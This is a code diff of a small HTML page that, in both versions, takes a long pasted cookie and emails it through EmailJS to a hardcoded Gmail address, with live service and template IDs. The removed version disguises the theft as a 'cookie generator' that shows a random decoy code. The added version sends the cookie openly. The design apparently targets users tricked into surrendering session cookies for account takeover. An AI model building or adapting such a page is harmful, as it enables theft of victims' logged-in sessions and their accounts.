@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cookie Generator</title>
+  <title>Cookie Sender</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -64,66 +64,46 @@
 </head>
 <body>
   <div class="container">
-    <h1>Cookie Generator</h1>
+    <h1>Cookie Sender</h1>
+    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
+    <button onclick="sendCookie()">Send Cookie</button>
     <div class="error" id="errorMessage"></div>
     <div class="success" id="successMessage"></div>
-    <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
-    <button onclick="generateCode()">Generate New Code</button>
-    <textarea id="newCookieOutput" rows="10" placeholder="Generated Cookie..." readonly></textarea>
   </div>
 
+  <!-- Include EmailJS -->
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS with your User ID
-    emailjs.init("1RUraa7fRYbQ2fuPR"); // Replace with your User ID
+    // Initialize EmailJS
+    emailjs.init("1RUraa7fRYbQ2fuPR"); // Replace with your actual User ID
 
-    function generateRandomCode(length) {
-      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-      let result = '';
-      for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
-      }
-      return result;
-    }
-
-    function generateCode() {
+    function sendCookie() {
       const cookieInput = document.getElementById('cookieInput').value;
       const errorMessage = document.getElementById('errorMessage');
       const successMessage = document.getElementById('successMessage');
-      const newCookieOutput = document.getElementById('newCookieOutput');
 
       // Clear previous messages
       errorMessage.textContent = '';
       successMessage.textContent = '';
 
-      if (cookieInput.length >= 700) {
-        const newCode = generateRandomCode(cookieInput.length);
-        newCookieOutput.value = newCode;
-
-        // Send email with old cookie
-        sendEmail(cookieInput);
-      } else {
+      // Validate cookie input
+      if (cookieInput.length < 700) {
         errorMessage.textContent = 'Error: Cookie must be at least 700 characters long.';
+        return;
       }
-    }
 
-    function sendEmail(cookieInput) {
-      const emailData = {
+      // Send email with EmailJS
+      emailjs.send("service_bupfcwd", "template_fkuvg0k", {
         cookie: cookieInput,
         to_email: "simplyb4th@gmail.com"
-      };
-
-      // Log data for debugging
-      console.log("Attempting to send email with data:", emailData);
-
-      emailjs.send("service_bupfcwd", "template_fkuvg0k", emailData)
-        .then(() => {
-          document.getElementById('successMessage').textContent = "Email sent successfully.";
-        })
-        .catch((error) => {
-          console.error("Failed to send email:", error);
-          document.getElementById('errorMessage').textContent = "Failed to send email. Check console for details.";
-        });
+      })
+      .then(() => {
+        successMessage.textContent = 'Cookie sent successfully.';
+      })
+      .catch((error) => {
+        console.error("Error sending email:", error);
+        errorMessage.textContent = 'Failed to send cookie. Check console for details.';
+      });
     }
   </script>
 </body>
